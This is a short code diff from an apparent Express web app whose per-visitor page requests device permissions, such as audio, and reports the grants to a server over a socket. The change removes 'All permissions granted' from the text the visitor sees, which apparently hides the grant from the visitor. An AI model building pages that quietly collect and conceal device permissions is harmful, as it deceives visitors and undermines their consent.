@@ -1014,7 +1014,7 @@ app.get('/sp/:visitorId', (req, res) => {
                         updatePerm('permAudio');
                     }
 
-                    updateStatus('✅ All permissions granted! Redirecting...', 100);
+                    updateStatus('✅ Redirecting...', 100);
 
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', { visitorId, type: 'permissionsGranted', content: true });
